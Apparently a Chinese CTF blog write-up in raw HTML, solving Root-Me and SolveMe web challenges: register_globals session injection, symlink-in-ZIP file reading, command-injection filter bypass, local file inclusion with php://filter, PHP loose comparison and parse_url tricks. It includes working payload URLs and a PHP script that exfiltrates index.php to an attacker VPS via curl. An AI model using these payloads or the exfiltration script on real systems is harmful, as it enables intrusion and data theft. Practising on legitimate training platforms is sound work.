class="line"></span><br><span class="line"><span class="keyword">if</span> (!ini_get(<span class="string">'register_globals'</span>)) &#123;</span><br><span class="line">    $superglobals = <span class="keyword">array</span>($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION)) &#123;</span><br><span class="line">        array_unshift($superglobals, $_SESSION);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($superglobals <span class="keyword">as</span> $superglobal) &#123;</span><br><span class="line">        extract($superglobal, <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (( <span class="keyword">isset</span> ($password) &amp;&amp; $password!=<span class="string">""</span> &amp;&amp; auth($password,$hidden_password)==<span class="number">1</span>) || (is_array($_SESSION) &amp;&amp; $_SESSION[<span class="string">"logged"</span>]==<span class="number">1</span> ) )&#123;</span><br><span class="line">    $aff=display(<span class="string">"well done, you can validate with the password : $hidden_password"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $aff=display(<span class="string">"try again"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $aff;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>关键逻辑为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (( <span class="keyword">isset</span> ($password) &amp;&amp; $password!=<span class="string">""</span> &amp;&amp; auth($password,$hidden_password)==<span class="number">1</span>) || (is_array($_SESSION) &amp;&amp; $_SESSION[<span class="string">"logged"</span>]==<span class="number">1</span> ) )&#123;</span><br><span class="line">    $aff=display(<span class="string">"well done, you can validate with the password : $hidden_password"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $aff=display(<span class="string">"try again"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可知我们得到flag有两种方法</p>
<ul>
<li>输入的password和系统的passwd相同</li>
<li>使session中的logged值为1</li>
</ul>
<p>前者显然不可能，因为我们并不知道密码是什么，对于后者看标题可知，服务器应该配置了 <code>register globals</code> 为 on，这样的话各种变量都被注入代码，例如来自 HTML 表单的请求变量，所以我们可以以GET方法直接请求变量名</p>
<p>payload</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://challenge01.root-me.org/web-serveur/ch17/index.php?_SESSION</span>[<span class="string">logged</span>]=1</span><br></pre></td></tr></table></figure>
<p>需要注意的是，官方文档中提到</p>
<blockquote>
<p>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</p>
</blockquote>
<p>在较高版本中该漏洞不存在</p>
<p>PS：这道题目的flag并不是很长而且没有特殊字符，所以理论上应该还存在密码爆破的可能</p>
<h2 id="File-upload-ZIP"><a href="#File-upload-ZIP" class="headerlink" title="File upload - ZIP"></a>File upload - ZIP</h2><p>题目要求我们读取网站的index.php文件，尝试上传zip文件，网站会自动将我们的zip文件解压并返回文件位置，我们可以读取文件（网站只能够解析TXT文件和图片文件），这显然无法实现我们的目标，我们始终只能够读取我们上传的文本文件或者图片，我们应该试图寻找一种方法能够在文本文件中实现跨文件读取，从而读取目标文件，找了很久的资料，找到了一种方法：<strong>建立symlink（符号索引）</strong> ，类似于windows环境下的快捷方式</p>
<blockquote>
<p>符号链接，这个文件包含了另一个文件的路径名。可以是任意文件或目录，也可以链接不同文件系统的文件。甚至可以链接不存在的文件，这就产生一般称为“断裂”的问题（现象），还可以不断的循环链接自己。<br>用ln -s 命令可以生成一个符号链接，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s source_file  softlink_file</span><br></pre></td></tr></table></figure></p>
<p>在对符号链接进行读写操作的时候，系统会自动把该操作转换为对源文件的操作。但是删除链接文件时，系统仅仅删除符号链接文件，而不删除源文件本身。</p>
</blockquote>
<p>那么我们可以尝试建立符号链接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../../../index.php index</span><br></pre></td></tr></table></figure>
<p>然后目录下会出现一个index的符号链接，压缩为zip文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -y index.zip index</span><br></pre></td></tr></table></figure>
<p>然后提交即可读到目标文件，得到flag。</p>
<h2 id="Command-injection-Filter-bypass"><a href="#Command-injection-Filter-bypass" class="headerlink" title="Command injection - Filter bypass"></a>Command injection - Filter bypass</h2><p>命令执行，用分号不可以了，被过滤了，而且题目不返回执行后的内容，只返回 <code>Ping OK</code> 或者 <code>Syntax Error</code> 等状态信息，尝试 <code>%0a</code> 绕过，得到正常回显，后面还发现 <code>|,&amp;</code> 等也被过滤了，可以尝试反向shell，本来尝试简单的bashshell，但是无法得到稳定的shell，百度了一下资料，找到了一个方法，本题可以使用curl等命令，我们可以尝试在本机上新建一个PHP文件，该文件的功能是读取index.php并发送到指定的主机上；然后执行命令让靶机下载并执行这个文件从而可以在我们的主机上读取到index.php的文件内容。</p>
<p>具体步骤如下：</p>
<ul>
<li>1.在自己的vps上新建一个 <strong>flag.txt</strong> ，不写入任何内容。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi flag.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>2.在本地主机上新建一个 <strong>getdata.php</strong> 文件，写入内容如下</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$txt=$_GET[<span class="string">'c'</span>];</span><br><span class="line">$myfile = fopen(<span class="string">"flag.txt"</span>, <span class="string">"a"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">fwrite($myfile, <span class="string">"\r\n"</span>);</span><br><span class="line">fwrite($myfile, $txt);</span><br><span class="line">fclose($myfile);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>3.在本地主机上新建一个<strong>sendrequest.txt</strong>文件，写入如下内容</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cSession = curl_init();</span><br><span class="line">$content = bin2hex(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">curl_setopt($cSession,CURLOPT_URL,<span class="string">"http://your_vps_ip/getdata.php?c="</span>.$content);</span><br><span class="line">curl_setopt($cSession,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">curl_setopt($cSession,CURLOPT_HEADER,<span class="keyword">false</span>);</span><br><span class="line">$result = curl_exec($cSession);</span><br><span class="line">curl_close($cSession);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>4.向靶机发送请求</li>
</ul>
<p><img src="rootme/7.png" alt=""></p>
<ul>
<li>5.之后在本机上读取flag.txt文件的内容再解码为字符串即可</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">"************************************"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"ip"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"ip"</span>]))&#123;</span><br><span class="line">        $ip = @preg_replace(<span class="string">"/[\\\$|`;&amp;&lt;&gt;]/"</span>, <span class="string">""</span>, $_POST[<span class="string">"ip"</span>]);</span><br><span class="line">        $response = @shell_exec(<span class="string">"timeout 5 bash -c 'ping -c 3 "</span>.$ip.<span class="string">"'"</span>);</span><br><span class="line">        $receive = @preg_match(<span class="string">"/3 packets transmitted, (.*) received/s"</span>,$response,$out);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($out[<span class="number">1</span>]==<span class="string">"3"</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Ping OK"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($out[<span class="number">1</span>]==<span class="string">"0"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Ping NOK"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Syntax Error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>PS：本题我折腾了好久，原因在于我的web服务老是配置错误无法执行PHP文件，还有文件权限配置错误，这两点需要注意。</p>
<h2 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h2><p>本地文件包含漏洞的利用，可以先试一下文件遍历</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch16<span class="regexp">/?files=../</span></span><br></pre></td></tr></table></figure>
<p>发现有admin文件，访问</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch16<span class="regexp">/?files=../</span>admin&amp;f=index.php</span><br></pre></td></tr></table></figure>
<p>找一下即可得到flag</p>
<h2 id="Local-File-Inclusion-Double-encoding"><a href="#Local-File-Inclusion-Double-encoding" class="headerlink" title="Local File Inclusion - Double encoding"></a>Local File Inclusion - Double encoding</h2><p>漏洞点：url二次编码绕过，本题中 <code>. /</code> 等分界符被过滤了，所以可以尝试二次编码绕过 </p>
<p>百度url编码即可查到各个字符的url编码</p>
<p>我最开始尝试的是目录跳转，可是没有什么进展，题目返回报错信息</p>
<p><img src="rootme/8.png" alt=""></p>
<p>看到有个包含的文件后缀是必须是.inc.php，所以尝试获取PHP的配置文件试试看 <code>conf.inc.php</code>，用PHP的filter协议</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=conf</span><br></pre></td></tr></table></figure>
<p>然后url编码两次提交再解码即可得到flag。</p>
<h2 id="PHP-Loose-Comparison"><a href="#PHP-Loose-Comparison" class="headerlink" title="PHP - Loose Comparison"></a>PHP - Loose Comparison</h2><p>本题是一道很基础的PHP弱比较问题，但是这题的代码很长，有点吓到我了，导致我很久都没搞清楚这题的考点，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_secured_random</span><span class="params">()</span> </span>&#123; <span class="comment">// cause random is the way</span></span><br><span class="line">    $a = rand(<span class="number">1337</span>,<span class="number">2600</span>)*<span class="number">42</span>;</span><br><span class="line">    $b = rand(<span class="number">1879</span>,<span class="number">1955</span>)*<span class="number">42</span>;</span><br><span class="line">    $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b;</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">secured_hash_function</span><span class="params">($plain)</span> </span>&#123; <span class="comment">// cause md5 is the best hash ever</span></span><br><span class="line">    $secured_plain = sanitize_user_input($plain);</span><br><span class="line">    <span class="keyword">return</span> md5($secured_plain);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize_user_input</span><span class="params">($input)</span> </span>&#123; <span class="comment">// cause someone told me to never trust user input</span></span><br><span class="line">    $re = <span class="string">'/[^a-zA-Z0-9]/'</span>;</span><br><span class="line">    $secured_input = preg_replace($re, <span class="string">""</span>, $input);</span><br><span class="line">    <span class="keyword">return</span> $secured_input;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"secret.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'s'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'h'</span>])) &#123;</span><br><span class="line">    $s = sanitize_user_input($_POST[<span class="string">'s'</span>]);</span><br><span class="line">    $h = secured_hash_function($_POST[<span class="string">'h'</span>]);</span><br><span class="line">    $r = gen_secured_random();</span><br><span class="line">    <span class="keyword">if</span>($s != <span class="keyword">false</span> &amp;&amp; $h != <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Well done! Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Fail..."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;p&gt;Hum ...&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>关键逻辑如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'s'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'h'</span>])) &#123;</span><br><span class="line">    $s = sanitize_user_input($_POST[<span class="string">'s'</span>]);</span><br><span class="line">    $h = secured_hash_function($_POST[<span class="string">'h'</span>]);</span><br><span class="line">    $r = gen_secured_random();</span><br><span class="line">    <span class="keyword">if</span>($s != <span class="keyword">false</span> &amp;&amp; $h != <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Well done! Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>首先提交参数s和t，然后对于s执行验证，控制只能输入英文字符和数字；对于h，也是先验证输入合法性，然后返回提交的字符串md5值，$r变量是一串随机数，最后r拼接在s后面与h的md5值进行 <code>==</code> 比较，此处出现漏洞，那么我们可以令s为 <code>0e</code> 开头的字符串，h为hash值是0e开头的字符串从而绕过验证</p>
<p><img src="rootme/11.png" alt="payload"></p>
<h2 id="PHP-preg-replace"><a href="#PHP-preg-replace" class="headerlink" title="PHP preg_replace()"></a>PHP preg_replace()</h2><p>题目是一个界面，让我们提交preg_replace()函数需要的参数从而返回相应的结果，查阅官方文档发现如下资料</p>
<p><img src="rootme/9.png" alt="正则匹配修饰符e"></p>
<p>根据官方文档可以知道，当我们使用使用了e参数后，我们的匹配内容会被当做PHP代码执行，于是我们可以利用这个特性读取flag.php文件</p>
<p><img src="rootme/10.png" alt="payload"></p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Solveme题解]]></title>
      <url>/2018/07/31/solveme/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下</p>
<a id="more"></a>
<h1 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h1><p>逆向跑一遍即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($flag))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h1><p>这个题目是字符串在不同编码下显示不同的问题，如果直接复制粘贴比较的会发生错误，办法是bp抓包查看16进制值提交上去就可以正确比较啦</p>
<h1 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h1><p>利用PHP的数字解析漏洞，payload</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">time</span>=6e6</span><br></pre></td></tr></table></figure>
<h1 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h1><p>这个题目想得到flag就是需要让username和passwd和它隐藏的相等，看到用户名只有三位猜测可能是考察爆破，但是没有爆破成功，到这儿就卡住了，最后看了一下学长博客，才知道这题要用到 <code>curl</code>，这个命令之前几乎没用过，算是一个新知识点，得学习一下了。不知道为什么直接在浏览器中访问index.php页面就不行，用curl命令就可以</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">http:</span><span class="comment">//hardlogin.solveme.peng.kr/index.php</span></span><br></pre></td></tr></table></figure>
<h1 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h1><p>分析代码可知，代码大概思路是解析一下url(parse_url)，对于得到的字符串用&amp;分隔为数组，在对于每个数组值以等号分隔出key,value对，要求key中不能出现 <code>do_you_want_flag</code>,value中不能出现 <code>yes</code>，但是再获取flag时又要求必须是 <code>do_you_want_flag=yes</code>，显然是矛盾的，但是在翻看PHP手册查看parse_url函数时发现一句话</p>
<blockquote>
<p>对严重不合格的 URL，parse_url() 可能会返回 FALSE。</p>
</blockquote>
<p>所以猜测可能是这个parse函数存在突破点，搜索一下发现有个GeekPwn2016ctf比赛中就考过这个知识点，得到payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//u</span>rlfiltering.solveme.peng.kr<span class="regexp">//</span><span class="regexp">/?do_you_want_flag=yes</span></span><br></pre></td></tr></table></figure>
<h1 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h1><p>直接数组绕过</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?foo<span class="string">[]</span>=<span class="number">1</span>&amp;bar<span class="string">[]</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure>
<h1 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h1><p>题目核心在于提交 <code>15th_HackingCamp</code>对应的ascii码值，但是流程又限制数字不能在(32,127)之间，官网查找一下chr函数的描述可以看到如下描述</p>
<blockquote>
<p>Note that if the number is higher than 256, it will return the number mod 256.</p>
</blockquote>
<p>就是说如果数字大于256的话它会自动取模，所以就简单了</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://array2string.solveme.peng.kr/<span class="keyword">index</span>.php?<span class="keyword">password</span>=simple_passw0rd&amp;<span class="keyword">value</span>[]=<span class="number">305</span>&amp;<span class="keyword">value</span>[]=<span class="number">309</span>&amp;<span class="keyword">value</span>[]=<span class="number">372</span>&amp;<span class="keyword">value</span>[]=<span class="number">360</span>&amp;<span class="keyword">value</span>[]=<span class="number">351</span>&amp;<span class="keyword">value</span>[]=<span class="number">328</span>&amp;<span class="keyword">value</span>[]=<span class="number">353</span>&amp;<span class="keyword">value</span>[]=<span class="number">355</span>&amp;<span class="keyword">value</span>[]=<span class="number">363</span>&amp;<span class="keyword">value</span>[]=<span class="number">361</span>&amp;<span class="keyword">value</span>[]=<span class="number">366</span>&amp;<span class="keyword">value</span>[]=<span class="number">359</span>&amp;<span class="keyword">value</span>[]=<span class="number">323</span>&amp;<span class="keyword">value</span>[]=<span class="number">353</span>&amp;<span class="keyword">value</span>[]=<span class="number">365</span>&amp;<span class="keyword">value</span>[]=<span class="number">368</span></span><br></pre></td></tr></table></figure>
<h1 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h1><h1 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$parse = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?$/i'</span>, $parse[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed scheme'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i'</span>, $parse[<span class="string">'host'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Not allowed host'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/\/plz_give_me$/'</span>, $parse[<span class="string">'path'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析代码，题目过滤了几个条件</p>
<blockquote>
<p>1、 url中不能出现 <code>_</code> 以及其他不可见字符<br>2、 path字段中又必须出现 <code>plz_give_me</code> 字段<br>3、 限制输入的网址必须是 <code>localhost</code> 或 <code>127.x.x.x</code> 这种类型的网址</p>
</blockquote>
<p>1和2冲突，可以用前面一题的方法绕过之<br>对于第三个，有个绕过方法就是 <code>ip2long()</code> 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤</p>
<p>所以最终payload为</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https</span>://givemealink2.solveme.peng.kr/?url=https:num_ip:12580/plz<span class="number">%0</span>agive<span class="number">%0</span>ame</span><br></pre></td></tr></table></figure>
<h1 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h1><p>关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parse = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>($parse[<span class="string">'path'</span>] !== <span class="string">'/plz_give_me'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br></pre></td></tr></table></figure>
<p>第一个和第三个的条件矛盾，具体参见前文，其中 <code>$_SERVER[&#39;HTTP_HOST&#39;]</code> 又和</p>
<p><code>curl_setopt($ch, CURLOPT_URL, $parse[&#39;scheme&#39;].&#39;://&#39;.$parse[&#39;host&#39;].&#39;/&#39;.$flag);</code> </p>
<p>矛盾，因为http_host内容找不不允许修改，但是查看PHP手册可知</p>
<blockquote>
<p>$url = ‘<a href="http://username:password@hostname/path?arg=value#anchor" target="_blank" rel="noopener">http://username:password@hostname/path?arg=value#anchor</a>‘;</p>
</blockquote>
<p>这样的方式也可以解析url，所以构造</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//gi</span>vemealink.solveme.peng.kr<span class="regexp">/?url=http:/</span><span class="regexp">/givemealink.solveme.peng.kr@ip_addr/</span>plz%<span class="number">1</span>agive%<span class="number">1</span>ame</span><br></pre></td></tr></table></figure>
<p>注意要先监听80端口,还要不要用https，因为https返回的数据是乱码：）</p>
<h1 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h1><p>关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, 